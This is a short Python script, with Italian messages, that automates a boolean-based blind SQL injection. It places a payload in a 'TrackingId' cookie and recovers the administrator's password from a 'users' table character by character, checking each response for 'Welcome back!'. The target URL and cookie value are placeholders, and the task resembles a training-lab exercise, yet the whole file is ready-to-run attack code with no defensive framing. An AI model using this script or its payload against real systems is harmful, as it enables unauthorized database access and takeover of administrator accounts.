import requests
from bs4 import BeautifulSoup

import time


url = 'https://example.com'


headers = {
    'User-Agent': 'TUO USER AGENT',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}


password_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'

def find_password(url, headers):
    start_time = time.time()
    result = []  
    session = requests.Session()  

    for param in range(1, 21):  
        for value in password_chars:
            
            cookie_value = f"COOKIEDASOSTITUIRE' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {param}, 1) = '{value}' -- "
            cookies = {'TrackingId': cookie_value}

           
            response = session.get(url, headers=headers, cookies=cookies)

            
            soup = BeautifulSoup(response.text, 'html.parser')

            
            if soup.find(string="Welcome back!"):
                result.append(value)
                print(f"[+] Carattere trovato: {value} → Password parziale: {''.join(result)}")
                break  
    end_time = time.time()
    execution_time = end_time - start_time  
    print(f"\n[!] Tempo di esecuzione: {execution_time:.4f} secondi")            
    return ''.join(result)  


password = find_password(url, headers)
print(f"\n[!] Password trovata: {password}")
